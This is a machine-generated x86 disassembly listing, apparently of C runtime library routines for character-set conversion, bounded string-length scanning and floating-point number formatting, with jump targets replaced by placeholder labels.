call sub_4147d3
pop ecx
pop ecx
pop ebp
retn
sub_414838
mov edi edi
push ebp
mov ebp esp
sub esp 0x1c
lea ecx [ ebp - 0x1c ]
push ebx
push [ ebp + 0x10 ]
call sub_40ee04
mov ebx [ ebp + 0x8 ]
cmp ebx 0x100
jae r-xdata
xor eax eax
mov [ ebp - 0x4 ] ax
mov [ ebp - 0x2 ] al
mov eax [ ebp - 0x18 ]
cmp [ eax + 0x4 ] 0x1
jle r-xdata
lea eax [ ebp - 0x18 ]
push eax
push ebx
call sub_414982
pop ecx
pop ecx
test al al
je r-xdata
call sub_4135e3
xor ecx ecx
mov [ eax ] 0x2a
xor eax eax
mov [ ebp - 0x4 ] bl
inc ecx
mov [ ebp - 0x3 ] al
mov eax ebx
lea ecx [ ebp - 0x18 ]
sar eax 0x8
mov [ ebp - 0xc ] eax
push ecx
movzx eax al
push eax
call sub_418b29
pop ecx
pop ecx
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
mov eax [ ebp - 0x18 ]
mov eax [ eax + 0x94 ]
movzx ecx [ eax + ebx ]
je r-xdata
cmp eax 0x1
jne r-xdata
cmp [ ebp - 0x10 ] al
je r-xdata
mov eax [ ebp - 0xc ]
mov [ ebp - 0x4 ] al
xor eax eax
push 0x2
mov [ ebp - 0x3 ] bl
mov [ ebp - 0x2 ] al
pop ecx
jmp r-xdata
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov eax ecx
jmp r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
movzx edx [ ebp - 0x8 ]
movzx eax [ ebp - 0x7 ]
shl edx 0x8
or edx eax
cmp [ ebp - 0x10 ] 0x0
je r-xdata
cmp [ ebp - 0x10 ] 0x0
movzx eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x1c ]
and [ eax + 0x350 ] 0xfffffffd
jmp r-xdata
mov [ ebp - 0x8 ] ax
lea edx [ ebp - 0x8 ]
mov [ ebp - 0x6 ] al
mov eax [ ebp - 0x18 ]
push 0x1
push [ eax + 0x8 ]
push 0x3
push edx
push ecx
lea ecx [ ebp - 0x4 ]
push ecx
push [ ebp + 0xc ]
push [ eax + 0xa8 ]
lea eax [ ebp - 0x18 ]
push eax
call sub_418d7f
add esp 0x24
test eax eax
jne r-xdata
pop ebx
mov esp ebp
pop ebp
retn
mov eax edx
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
mov ecx [ ebp - 0x1c ]
and [ ecx + 0x350 ] 0xfffffffd
jmp r-xdata
sub_414982
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push 0x1
push [ ebp + 0x8 ]
call sub_41292e
add esp 0xc
neg eax
sbb eax eax
neg eax
pop ebp
retn
sub_4149b9
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
lea eax [ ecx - 0x41 ]
cmp eax 0x19
ja r-xdata
push 0x0
push [ ebp + 0x8 ]
call sub_41499f
pop ecx
pop ecx
mov ecx eax
jmp r-xdata
mov eax ecx
pop ebp
retn
add ecx 0x20
sub_4149e9
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0x10 ]
mov edx [ ebp + 0xc ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
test ecx ecx
je r-xdata
pop ebp
retn
mov [ ecx ] edx
sub_414a04
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4149e9
add esp 0xc
push 0x0
call sub_411f88
add esp 0x14
mov esp ebp
pop ebp
retn
sub_414a30
mov edi edi
push ebp
mov ebp esp
push ecx
push 0x1
push [ ebp + 0x10 ]
push ecx
push ecx
mov eax esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push eax
call sub_4149e9
add esp 0xc
push 0x0
call sub_4121b0
add esp 0x14
mov esp ebp
pop ebp
retn
sub_414a5c
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
mov esi [ ebp + 0xc ]
test esi esi
je r-xdata
xor eax eax
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
cmp [ esi ] 0x0
jne r-xdata
push edi
push [ ebp + 0x14 ]
lea ecx [ ebp - 0x10 ]
call sub_40ee04
mov eax [ ebp - 0xc ]
cmp [ eax + 0xa8 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
lea eax [ ebp - 0xc ]
push eax
movzx eax [ esi ]
push eax
call sub_418b29
pop ecx
pop ecx
test eax eax
je r-xdata
mov ecx [ ebp + 0x8 ]
test ecx ecx
je r-xdata
xor ecx ecx
mov [ eax ] cx
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
xor edi edi
push eax
push [ ebp + 0x8 ]
mov eax [ ebp - 0xc ]
inc edi
push edi
push esi
push 0x9
push [ eax + 0x8 ]
call [ MultiByteToWideChar@IAT ]
test eax eax
jne r-xdata
mov edi [ ebp - 0xc ]
cmp [ edi + 0x4 ] 0x1
jle r-xdata
xor edi edi
inc edi
jmp r-xdata
movzx eax [ esi ]
mov [ ecx ] ax
cmp [ ebp - 0x4 ] 0x0
je r-xdata
call sub_4135e3
or edi 0xffffffff
mov [ eax ] 0x2a
cmp ebx [ edi + 0x4 ]
cmp ebx [ edi + 0x4 ]
jl r-xdata
mov eax edi
pop edi
jmp r-xdata
mov ecx [ ebp - 0x10 ]
and [ ecx + 0x350 ] 0xfffffffd
cmp [ esi + 0x1 ] 0x0
je r-xdata
jb r-xdata
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
push eax
push [ ebp + 0x8 ]
push [ edi + 0x4 ]
push esi
push 0x9
push [ edi + 0x8 ]
call [ MultiByteToWideChar@IAT ]
mov edi [ ebp - 0xc ]
test eax eax
jne r-xdata
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ edi + 0x4 ]
jmp r-xdata
sub_414b70
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
mov ebx [ ebp + 0xc ]
push edi
mov edi [ ebp + 0x10 ]
test ebx ebx
jne r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
push esi
cmp edi 0x7fffffff
jbe r-xdata
or [ eax ] 0xffffffff
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
push [ ebp + 0x18 ]
lea ecx [ ebp - 0x14 ]
call sub_40ee04
mov eax [ ebp - 0x10 ]
xor esi esi
cmp [ eax + 0xa8 ] esi
jne r-xdata
call sub_4135e3
push 0x16
pop esi
mov [ eax ] esi
call sub_413527
jmp r-xdata
xor eax eax
jmp r-xdata
and [ eax ] 0x0
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
push esi
push edi
push ebx
push 0x1
lea ecx [ ebp + 0x14 ]
push ecx
push esi
push [ eax + 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov ecx eax
test ecx ecx
je r-xdata
mov ax [ ebp + 0x14 ]
mov ecx 0xff
cmp ax cx
jbe r-xdata
mov eax esi
pop esi
pop edi
pop ebx
mov esp ebp
pop ebp
retn
call [ GetLastError@IAT ]
cmp eax 0x7a
jne r-xdata
cmp [ ebp - 0x4 ] esi
jne r-xdata
test ebx ebx
je r-xdata
test ebx ebx
je r-xdata
call sub_4135e3
push 0x2a
pop esi
mov [ eax ] esi
test ebx ebx
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
mov eax [ ebp + 0x8 ]
test eax eax
je r-xdata
test edi edi
je r-xdata
test edi edi
je r-xdata
mov ecx [ ebp - 0x14 ]
and [ ecx + 0x350 ] 0xfffffffd
call sub_4135e3
push 0x22
pop esi
mov [ eax ] esi
call sub_413527
jmp r-xdata
test edi edi
je r-xdata
cmp [ ebp - 0x8 ] 0x0
je r-xdata
mov [ eax ] ecx
jmp r-xdata
mov [ eax ] 0x1
jmp r-xdata
mov [ ebx ] al
push edi
push esi
push ebx
call sub_40be70
add esp 0xc
push edi
push esi
push ebx
call sub_40be70
add esp 0xc
sub_414cae
mov edi edi
push ebp
mov ebp esp
mov eax [ rw-data ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0x1f
push 0x20
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
mov edx [ ebp + 0x8 ]
mov ecx edx
mov eax [ ebp + 0xc ]
add eax edx
cmp edx eax
je r-xdata
mov esi [ ebp + 0x8 ]
mov edx esi
and edx 0xf
push 0x10
pop eax
sub eax edx
neg edx
sbb edx edx
and edx eax
mov eax [ ebp + 0xc ]
cmp eax edx
jae r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx edx
cmp [ ecx ] 0x0
je r-xdata
lea edi [ edx + esi ]
mov ecx esi
cmp esi edi
je r-xdata
mov edx eax
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
inc ecx
cmp ecx eax
jne r-xdata
sub ecx esi
cmp ecx edx
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
pop edi
mov eax ecx
pop esi
pop ebp
retn
mov edi eax
add ecx esi
sub edi edx
mov eax edi
and eax 0x1f
sub edi eax
vxorps ymm1 ymm1 ymm1
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
mov edi eax
add ecx esi
sub edi edx
pxor xmm1 xmm1
mov eax edi
and eax 0xf
sub edi eax
add edi ecx
jmp r-xdata
inc ecx
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
cmp ecx edi
jne r-xdata
vpcmpeqb ymm0 ymm1 [ ecx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
movaps xmm0 [ ecx ]
pcmpeqb xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0xc ]
add eax esi
jmp r-xdata
add ecx 0x20
cmp ecx eax
jne r-xdata
add ecx 0x10
cmp ecx eax
jne r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
vzeroupper
jmp r-xdata
cmp [ ecx ] 0x0
je r-xdata
sub ecx esi
jmp r-xdata
inc ecx
inc ecx
sub_414dd5
mov edi edi
push ebp
mov ebp esp
push ecx
mov eax [ rw-data ]
mov ecx [ ebp + 0x8 ]
push esi
push edi
cmp eax 0x5
jl r-xdata
cmp eax 0x1
jl r-xdata
test cl 0x1
je r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
test cl 0x1
je r-xdata
mov esi ecx
and esi 0x1f
push 0x20
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
sub edx ecx
xor edi edi
mov esi ecx
and esi 0xf
push 0x10
pop eax
sub eax esi
neg esi
sbb esi esi
and esi eax
mov eax [ ebp + 0xc ]
shr esi 0x1
cmp eax esi
jae r-xdata
mov eax [ ebp + 0xc ]
mov edx ecx
lea eax [ ecx + eax * 2 ]
cmp ecx eax
je r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
add edx 0x2
cmp edx eax
jne r-xdata
lea edx [ ecx + esi * 2 ]
xor edi edi
mov [ ebp - 0x4 ] edx
mov edx ecx
cmp ecx [ ebp - 0x4 ]
je r-xdata
mov esi eax
xor edi edi
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx ecx
sar edx 0x1
cmp edx esi
jne r-xdata
cmp [ edx ] di
je r-xdata
add edx 0x2
cmp edx eax
jne r-xdata
pop edi
mov eax edx
pop esi
mov esp ebp
pop ebp
retn
lea edx [ ecx + edx * 2 ]
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0x1f
sub ecx eax
vxorps ymm1 ymm1 ymm1
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
lea edx [ ecx + edx * 2 ]
pxor xmm1 xmm1
mov ecx eax
sub ecx esi
mov eax ecx
and eax 0xf
sub ecx eax
lea ecx [ edx + ecx * 2 ]
jmp r-xdata
add edx 0x2
cmp edx [ ebp - 0x4 ]
jne r-xdata
cmp [ edx ] di
je r-xdata
jmp r-xdata
cmp edx ecx
jne r-xdata
cmp edx ecx
jne r-xdata
vpcmpeqw ymm0 ymm1 [ edx ]
vpmovmskb eax ymm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
movaps xmm0 [ edx ]
pcmpeqw xmm0 xmm1
pmovmskb eax xmm0
test eax eax
jne r-xdata
mov eax [ ebp + 0x8 ]
mov ecx [ ebp + 0xc ]
lea ecx [ eax + ecx * 2 ]
jmp r-xdata
add edx 0x20
cmp edx ecx
jne r-xdata
add edx 0x10
cmp edx ecx
jne r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
sar edx 0x1
vzeroupper
jmp r-xdata
cmp [ edx ] di
je r-xdata
sub edx eax
jmp r-xdata
add edx 0x2
add edx 0x2
sar edx 0x1
sub_414f8c
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_4179e7
mov [ esi ] eax
sub_414fb9
mov edi edi
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0xc ]
mov eax [ esi ]
cmp eax [ rw-data ]
je r-xdata
pop esi
pop ebp
retn
mov ecx [ ebp + 0x8 ]
mov eax [ rw-data ]
test [ ecx + 0x350 ] eax
jne r-xdata
call sub_416c50
mov [ esi ] eax
sub_414fe6
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov ecx 0x7ff
push ebx
push esi
xor edx edx
mov ebx [ eax ]
mov esi [ eax + 0x4 ]
mov eax esi
shr eax 0x14
and eax ecx
push edi
cmp eax ecx
jne r-xdata
xor eax eax
cmp edx edx
jne r-xdata
mov edi esi
mov eax ebx
and edi 0xfffff
or eax edi
jne r-xdata
mov ecx esi
mov eax edx
and ecx 0x80000000
or eax ecx
mov eax 0x80000
je r-xdata
inc eax
jmp r-xdata
and esi eax
or edx esi
je r-xdata
cmp ebx edx
jne r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
push 0x3
jmp r-xdata
push 0x2
jmp r-xdata
cmp edi eax
jne r-xdata
pop eax
jmp r-xdata
push 0x4
sub_415052
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
xor edx edx
mov ecx [ eax + 0x4 ]
mov eax edx
and ecx 0x80000000
or eax ecx
je r-xdata
mov al dl
pop ebp
retn
inc edx
sub_415070
mov edi edi
push ebp
mov ebp esp
sub esp 0x30
push ebx
push esi
push edi
mov edi [ ebp + 0x1c ]
xor ebx ebx
test edi edi
jns r-xdata
mov esi [ ebp + 0xc ]
lea ecx [ ebp - 0x30 ]
push [ ebp + 0x28 ]
mov [ esi ] bl
call sub_40ee04
lea eax [ edi + 0xb ]
cmp [ ebp + 0x10 ] eax
ja r-xdata
mov edi ebx
mov edx [ ebp + 0x8 ]
mov eax [ edx ]
mov ecx [ edx + 0x4 ]
mov [ ebp - 0x20 ] eax
mov eax ecx
shr eax 0x14
and eax 0x7ff
cmp eax 0x7ff
jne r-xdata
call sub_4135e3
push 0x22
pop edi
mov [ eax ] edi
call sub_413527
jmp r-xdata
and ecx 0x80000000
mov eax ebx
or eax ecx
je r-xdata
cmp ebx ebx
jne r-xdata
cmp [ ebp - 0x24 ] 0x0
je r-xdata
mov ecx [ edx + 0x4 ]
xor ebx ebx
cmp [ ebp + 0x20 ] bl
push 0x30
sete bl
mov [ ebp - 0xc ] 0x3ff
dec ebx
xor eax eax
and ebx 0xffffffe0
and ecx 0x7ff00000
add ebx 0x27
or eax ecx
mov [ ebp - 0x1c ] ebx
pop eax
jne r-xdata
mov [ esi ] 0x2d
inc esi
push ebx
push [ ebp + 0x24 ]
push ebx
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
push edx
call sub_415373
mov edi eax
add esp 0x24
test edi edi
je r-xdata
mov eax edi
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x30 ]
and [ ecx + 0x350 ] 0xfffffffd
mov [ esi ] 0x31
inc esi
mov [ esi ] al
inc esi
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
and eax 0xfffff
or ecx eax
jne r-xdata
push 0x65
push esi
call sub_41d4a0
pop ecx
pop ecx
test eax eax
je r-xdata
mov [ esi ] bl
jmp r-xdata
mov eax [ ebp - 0x2c ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ ecx ] al
mov [ ecx ] 0x0
jmp r-xdata
mov [ ebp - 0xc ] 0x3fe
jmp r-xdata
and [ ebp - 0xc ] ecx
jmp r-xdata
mov edi ebx
jmp r-xdata
cmp [ ebp + 0x20 ] bl
sete cl
dec cl
and cl 0xe0
add cl 0x70
mov [ eax ] cl
mov [ eax + 0x3 ] bl
and [ ebp - 0x4 ] 0x0
mov ecx 0xf0000
push 0x30
pop eax
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x10 ] ecx
cmp [ edx ] 0x0
jbe r-xdata
mov eax [ edx + 0x4 ]
and eax 0xfffff
mov [ ebp - 0x10 ] eax
ja r-xdata
mov ecx esi
inc esi
mov [ ebp - 0x18 ] ecx
test edi edi
jne r-xdata
test ax ax
js r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_41d370
push 0x30
pop ecx
add ax cx
movzx eax ax
cmp eax 0x39
jbe r-xdata
test edi edi
jle r-xdata
mov eax [ edx ]
mov edx [ edx + 0x4 ]
and eax [ ebp - 0x4 ]
and edx ecx
mov ecx [ ebp - 0x8 ]
and edx 0xfffff
movsx ecx cx
call sub_41d370
cmp ax 0x8
jbe r-xdata
mov ecx [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0x4 ]
shrd eax ecx 0x4
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
shr ecx 0x4
sub eax 0x4
dec edi
mov [ ebp - 0x10 ] ecx
mov [ ebp - 0x8 ] eax
test ax ax
jns r-xdata
add eax ebx
mov eax [ ebp - 0x18 ]
cmp [ eax ] 0x0
jne r-xdata
push edi
push 0x30
pop eax
push eax
push esi
call sub_40be70
add esp 0xc
add esi edi
push 0x30
lea eax [ esi - 0x1 ]
pop ebx
test edi edi
jle r-xdata
cmp [ ebp + 0x20 ] 0x0
mov cl 0x34
mov edx [ ebp + 0x8 ]
sete al
dec al
and al 0xe0
add al 0x70
mov [ esi ] al
mov eax [ edx ]
mov edx [ edx + 0x4 ]
call sub_41d370
mov ecx eax
xor ebx ebx
and ecx 0x7ff
sub ecx [ ebp - 0xc ]
sbb ebx ebx
js r-xdata
mov esi eax
mov [ eax ] bl
dec eax
jmp r-xdata
cmp cl 0x46
jne r-xdata
mov [ esi + 0x1 ] 0x2d
add esi 0x2
neg ecx
adc ebx 0x0
neg ebx
jg r-xdata
mov cl [ eax ]
cmp cl 0x66
je r-xdata
mov ebx [ ebp - 0x1c ]
cmp eax [ ebp - 0x18 ]
je r-xdata
cmp esi edi
jne r-xdata
mov eax 0x3e8
jg r-xdata
mov [ esi + 0x1 ] 0x2b
add esi 0x2
jmp r-xdata
test ecx ecx
jb r-xdata
inc [ eax - 0x1 ]
mov cl [ eax ]
cmp cl 0x39
jne r-xdata
push 0x0
push 0xa
push ebx
push ecx
call sub_41d250
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
push 0x0
push eax
push ebx
push ecx
call sub_41d250
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
cmp esi edi
jne r-xdata
cmp ecx eax
jb r-xdata
mov edi esi
push 0x30
pop eax
mov [ esi ] al
test ebx ebx
jl r-xdata
inc cl
mov [ eax ] cl
jmp r-xdata
add bl 0x3a
mov [ eax ] bl
jmp r-xdata
push 0x30
pop eax
add cl al
xor edi edi
mov [ esi ] cl
mov [ esi + 0x1 ] 0x0
jg r-xdata
push 0x0
push 0x64
push ebx
push ecx
call sub_41d250
add al 0x30
mov [ ebp - 0x1c ] edx
mov [ esi ] al
inc esi
test ebx ebx
jl r-xdata
cmp ecx 0xa
jb r-xdata
jg r-xdata
cmp ecx 0x64
jb r-xdata
sub_415373
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
lea eax [ ebp - 0xc ]
push esi
mov esi [ ebp + 0x1c ]
push edi
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
lea edi [ esi + 0x1 ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_41935e
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
lea eax [ ebp - 0xc ]
push eax
push edi
mov edi [ ebp + 0xc ]
push ecx
xor ecx ecx
cmp [ ebp - 0xc ] 0x2d
sete cl
xor eax eax
test esi esi
setg al
add ecx edi
add eax ecx
push eax
call sub_418dca
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
xor eax eax
test esi esi
setg al
sub ecx eax
push [ ebp + 0x28 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push esi
push [ ebp + 0x10 ]
push edi
call sub_41540e
add esp 0x20
mov [ edi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_41540e
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push esi
push edi
mov edi [ ebp + 0x10 ]
test edi edi
jle r-xdata
xor eax eax
mov eax edi
jmp r-xdata
push ebx
push [ ebp + 0x24 ]
lea ecx [ ebp - 0x10 ]
call sub_40ee04
mov dl [ ebp + 0x20 ]
mov ebx [ ebp + 0x8 ]
test dl dl
je r-xdata
call sub_4135e3
push 0x22
pop esi
mov [ eax ] esi
call sub_413527
mov eax esi
add eax 0x9
cmp [ ebp + 0xc ] eax
ja r-xdata
mov eax [ ebp + 0x1c ]
mov esi ebx
cmp [ eax ] 0x2d
jne r-xdata
mov ecx [ ebp + 0x1c ]
xor eax eax
test edi edi
setg al
push eax
xor eax eax
cmp [ ecx ] 0x2d
sete al
add eax ebx
push eax
push [ ebp + 0xc ]
push ebx
call sub_41587d
mov dl [ ebp + 0x20 ]
add esp 0x10
test edi edi
jle r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
test dl dl
sete al
add eax edi
add esi eax
or eax 0xffffffff
cmp [ ebp + 0xc ] eax
je r-xdata
mov al [ esi + 0x1 ]
mov [ esi ] al
inc esi
mov eax [ ebp - 0xc ]
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
push r--data
push eax
push esi
call sub_411dd3
add esp 0xc
pop ebx
test eax eax
jne r-xdata
mov eax ebx
sub eax esi
add eax [ ebp + 0xc ]
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_413537
int3
lea ecx [ esi + 0x2 ]
cmp [ ebp + 0x14 ] al
je r-xdata
mov edx [ ebp + 0x1c ]
mov eax [ edx + 0x8 ]
cmp [ eax ] 0x30
je r-xdata
mov [ esi ] 0x45
cmp [ ebp + 0x18 ] 0x2
jne r-xdata
mov edx [ edx + 0x4 ]
sub edx 0x1
jns r-xdata
cmp [ ebp - 0x4 ] 0x0
je r-xdata
cmp [ ecx ] 0x30
jne r-xdata
push 0x64
pop edi
cmp edx edi
jl r-xdata
neg edx
mov [ esi + 0x1 ] 0x2d
xor eax eax
jmp r-xdata
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
push 0x3
lea eax [ ecx + 0x1 ]
push eax
push ecx
call sub_40dcd0
add esp 0xc
push 0xa
pop edi
cmp edx edi
jl r-xdata
mov eax edx
cdq
idiv edi
add [ esi + 0x2 ] al
pop edi
pop esi
mov esp ebp
pop ebp
retn
add [ esi + 0x4 ] dl
mov eax edx
cdq
idiv edi
add [ esi + 0x3 ] al
sub_415559
mov edi edi
push ebp
mov ebp esp
sub esp 0xc
xor eax eax
push esi
push edi
push [ ebp + 0x18 ]
lea edi [ ebp - 0xc ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0xc ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_41935e
or ecx 0xffffffff
add esp 0x18
cmp [ ebp + 0x10 ] ecx
je r-xdata
mov esi [ ebp + 0xc ]
lea eax [ ebp - 0xc ]
push eax
mov eax [ ebp - 0x8 ]
add eax edi
push eax
xor eax eax
cmp [ ebp - 0xc ] 0x2d
push ecx
sete al
add eax esi
push eax
call sub_418dca
add esp 0x10
test eax eax
je r-xdata
mov ecx [ ebp + 0x10 ]
xor eax eax
cmp [ ebp - 0xc ] 0x2d
sete al
sub ecx eax
push [ ebp + 0x20 ]
lea eax [ ebp - 0xc ]
push 0x0
push eax
push edi
push [ ebp + 0x10 ]
push esi
call sub_4155e6
add esp 0x18
mov [ esi ] 0x0
jmp r-xdata
pop edi
pop esi
mov esp ebp
pop ebp
retn
sub_4155e6
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push ebx
push esi
push edi
push [ ebp + 0x1c ]
call sub_40ee04
mov edx [ ebp + 0x14 ]
mov edi [ ebp + 0x10 ]
mov ebx [ ebp + 0x8 ]
mov ecx [ edx + 0x4 ]
dec ecx
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ edx ] 0x2d
mov esi ebx
jne r-xdata
cmp ecx edi
jne r-xdata
mov eax [ edx + 0x4 ]
test eax eax
jg r-xdata
mov [ ebx ] 0x2d
lea esi [ ebx + 0x1 ]
xor eax eax
cmp [ edx ] 0x2d
sete al
add eax ecx
mov [ eax + ebx ] 0x30
add esi eax
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_41587d
add esp 0x10
mov [ esi ] 0x30
inc esi
jmp r-xdata
cmp [ ebp - 0x4 ] 0x0
pop edi
pop esi
pop ebx
je r-xdata
push 0x1
push esi
push [ ebp + 0xc ]
push ebx
call sub_41587d
mov eax [ ebp - 0xc ]
add esp 0x10
mov eax [ eax + 0x88 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
mov eax [ ebp + 0x14 ]
mov ecx [ eax + 0x4 ]
test ecx ecx
jns r-xdata
test edi edi
jle r-xdata
xor eax eax
mov esp ebp
pop ebp
retn
mov eax [ ebp - 0x10 ]
and [ eax + 0x350 ] 0xfffffffd
cmp [ ebp + 0x18 ] 0x0
jne r-xdata
mov edi ecx
neg edi
mov eax ecx
neg eax
cmp eax edi
jge r-xdata
push edi
push esi
push [ ebp + 0xc ]
push ebx
call sub_41587d
push edi
push 0x30
push esi
call sub_40be70
add esp 0x1c
sub_4156bd
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push ebx
push esi
push edi
push [ ebp + 0x18 ]
xor eax eax
lea edi [ ebp - 0x10 ]
push [ ebp + 0x14 ]
stosd [ edi ]
stosd [ edi ]
stosd [ edi ]
lea eax [ ebp - 0x10 ]
mov edi [ ebp + 0x1c ]
push eax
mov eax [ ebp + 0x8 ]
push edi
push [ eax + 0x4 ]
push [ eax ]
call sub_41935e
mov eax [ ebp - 0xc ]
xor ecx ecx
mov ebx [ ebp + 0xc ]
add esp 0x18
cmp [ ebp - 0x10 ] 0x2d
sete cl
dec eax
mov [ ebp - 0x4 ] eax
or eax 0xffffffff
lea esi [ ecx + ebx ]
cmp [ ebp + 0x10 ] eax
je r-xdata
lea ecx [ ebp - 0x10 ]
push ecx
push edi
push eax
push esi
call sub_418dca
add esp 0x10
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
sub eax ecx
mov eax [ ebp - 0xc ]
dec eax
cmp [ ebp - 0x4 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ ebx ] 0x0
jmp r-xdata
push [ ebp + 0x28 ]
lea eax [ ebp - 0x10 ]
push 0x1
push eax
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push edi
